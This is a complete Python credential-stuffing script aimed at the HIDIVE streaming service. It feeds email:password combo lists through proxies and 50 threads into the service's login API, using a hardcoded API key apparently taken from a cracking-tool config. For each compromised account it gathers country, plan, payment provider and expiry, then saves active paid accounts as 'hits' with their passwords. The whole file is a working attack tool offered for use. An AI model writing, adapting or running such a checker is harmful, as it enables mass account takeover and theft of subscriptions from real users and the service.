import requests
import threading
import os
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

# --- CONFIGURATION ---
COMBO_FILE = "accounts.txt"
PROXY_FILE = "proxies.txt"
HITS_FILE = "Hidive hits.txt"
FREE_FILE = "free.txt"
THREADS = 50

stats = {"hits": 0, "free": 0, "fail": 0, "error": 0, "checked": 0}
print_lock = threading.Lock()

# --- API KEYS (from SB config @XD_HR) ---
API_KEY = "857a1e5d-e35e-4fdf-805b-a87b6f8364bf"
APP_VAR = "6.58.0.a0c6b52"
BASE = "https://dce-frontoffice.imggaming.com"

def get_proxies():
    plist = []
    if not os.path.exists(PROXY_FILE): return [None]
    try:
        with open(PROXY_FILE, "r") as f:
            for line in f:
                line = line.strip()
                if not line: continue
                p = line.split(':')
                if len(p) == 4:
                    plist.append({"http": f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}", "https": f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"})
                else:
                    plist.append({"http": f"http://{line}", "https": f"http://{line}"})
        return plist if plist else [None]
    except: return [None]

def make_headers():
    return {
        "Host": "dce-frontoffice.imggaming.com",
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "Realm": "dce.hidive",
        "x-app-var": APP_VAR,
        "Accept-Language": "en-US",
        "sec-ch-ua-mobile": "?1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "app": "dice",
        "x-api-key": API_KEY,
        "sec-ch-ua-platform": '"Android"',
        "Origin": "https://www.hidive.com",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "Referer": "https://www.hidive.com/",
        "Accept-Encoding": "gzip, deflate, br",
    }

def check(account, proxies):
    global stats
    try:
        email, password = account.split(":", 1)
    except ValueError:
        return

    session = requests.Session()
    proxy = proxies[stats["checked"] % len(proxies)] if proxies[0] else None
    headers = make_headers()

    try:
        # 1. LOGIN
        response = session.post(
            f"{BASE}/api/v2/login",
            json={"id": email, "secret": password},
            headers=headers, proxies=proxy, timeout=15
        )

        if "authorisationToken" not in response.text:
            if "failedAuthentication" in response.text or "NOT_FOUND" in response.text or response.status_code == 401:
                with print_lock: stats["fail"] += 1
            else:
                with print_lock: stats["error"] += 1
            return

        token = response.json()["authorisationToken"]
        headers["Authorization"] = f"Bearer {token}"

        # 2. ADDRESS → Country
        country = ""
        try:
            r_addr = session.get(f"{BASE}/api/v2/user/address", headers=headers, proxies=proxy, timeout=10)
            country = r_addr.json().get("countryCode", "")
        except: pass

        # 3. LICENCE-FAMILY → subscription
        sub_res = session.get(
            f"{BASE}/api/v2/licence-family?includeEntitlements=ALL_ACTIVE_USER_ENTITLEMENTS",
            headers=headers, proxies=proxy, timeout=10
        )

        sub_text = sub_res.text

        # Parse captures
        plan_name = ""
        plan_type = ""
        auto_renewal = ""
        payment_provider = ""
        account_status = ""
        expiry_date = "N/A"
        days_left = "0"

        try:
            data = sub_res.json()
            families = data.get("licenceFamilies", [])
            if families:
                fam = families[0]
                ents = fam.get("entitlements", [])
                if ents:
                    ent = ents[0]
                    plan_name = ent.get("name", "")
                    plan_type = ent.get("type", "")
                auto_renewal = fam.get("paymentEventType", "")
                ppi = fam.get("paymentProviderInfo")
                if isinstance(ppi, dict):
                    payment_provider = ppi.get("type", "")
                account_status = fam.get("status", "")
                expiry_ms = fam.get("expiryTimestamp", 0)
                if expiry_ms:
                    try:
                        dt = datetime.fromtimestamp(expiry_ms / 1000)
                        expiry_date = dt.strftime("%Y-%m-%d")
                        days_left = str((dt - datetime.now()).days)
                    except: pass
        except: pass

        # Fallback: LR parse between displayStyle and paymentProviderInfo
        if not account_status:
            try:
                chunk = sub_text.split('"displayStyle":')[1]
                chunk = chunk.split('"paymentProviderInfo"')[0]
                account_status = chunk.split('"status":"')[1].split('"')[0]
            except: pass

        # KEYCHECK: ACTIVE → HIT, else → FREE
        if "ACTIVE" in account_status.upper():
            cap = (
                f"{email}:{password} | "
                f"Country = {country} | "
                f"Plan = {plan_name} | "
                f"Plan Type = {plan_type} | "
                f"Has Auto Renewal = {auto_renewal} | "
                f"Payment Provider = {payment_provider} | "
                f"Account Status = {account_status} | "
                f"Expiry Date = {expiry_date} | "
                f"Days Left = {days_left}"
            )
            with open(HITS_FILE, "a", encoding="utf-8") as f:
                f.write(cap + "\n")
            with print_lock:
                stats["hits"] += 1
                print(f"[\033[92mHIT\033[0m] {email} | {account_status} | {plan_name}")
        else:
            with open(FREE_FILE, "a") as f:
                f.write(f"{email}:{password}\n")
            with print_lock:
                stats["free"] += 1
                print(f"[\033[93mFREE\033[0m] {email}")

    except Exception:
        with print_lock: stats["error"] += 1
    finally:
        with print_lock:
            stats["checked"] += 1
            print(f"\r[*] Checked: {stats['checked']} | Hits: {stats['hits']} | Free: {stats['free']} | Fails: {stats['fail']}", end="")

def main():
    if not os.path.exists(COMBO_FILE):
        print(f"[!] Please put your accounts in {COMBO_FILE}")
        return

    proxies = get_proxies()
    with open(COMBO_FILE, "r") as f:
        accs = [l.strip() for l in f if ":" in l]

    print(f"[*] Starting: {len(accs)} Accounts | Threads: {THREADS}\n")

    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        for a in accs:
            ex.submit(check, a, proxies)

    print(f"\n\n[*] Done! Total Hits: {stats['hits']}")

if __name__ == "__main__":
    main()
